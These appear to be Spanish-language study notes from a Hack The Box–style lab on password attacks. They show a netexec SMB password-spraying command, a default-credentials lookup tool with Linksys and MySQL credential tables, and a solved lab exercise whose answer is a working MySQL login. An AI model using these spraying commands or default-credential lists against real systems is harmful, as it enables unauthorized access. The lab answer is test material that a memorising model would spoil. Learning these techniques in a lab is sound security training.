En según que organizaciones se pone una contraseña conocida temporal (del tipo "ChangeMe123!") para que el usuario la cambie. 
Nosotros como atacantes podemos hacer fuerza bruta o "sparys" contra usuarios varios con una misma contraseña.

Por ejemplo, para un servicio "smb" podemos utilizar el comando:
```
Polika4RM@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
Este simplemente sobre una lista de usuarios prueba una contraseña única. 

---

### DEFAULT CREDENTIALS

Con el siguiente comando nos podemos descargar el programa "creds", para que te facilite usuarios y contraseñas por defecto de diferentes tipos de tecnologías:
```
sudo apt install pipx
pipx install defaultcreds-cheat-sheet
```

Y ejecutando lo siguiente veré diferentes credenciales por defecto utilizadas en el servicio "linksys":
```
┌──(polika4r㉿kali)-[~]
└─$ creds search linksys
+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```

---

**1. Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: <\username>:<\password>)
SSH to  with user "sam" and password "B@tm@n2022!"


Primero de todo, ingreso via SSH con las credenciales dadas:
```
ssh sam@10.129.75.192
	#introduzco el password "B@tm@n2022!"
```

Con esto, tengo que ingresar en un servidor mysql, pues lo haré mediante: 
```
mysql -h localhost -u <nombre_usuario> -p
	# me pedirá una contraseña
```

Para buscar contraseñas por defecto, ejecuto:
```
└─$ creds search mysql
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql (ssh)         |        root       |   root   |
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+

```

Hago todas las combinaciones una por una y veo que la que funciona es: *superdba:admin*

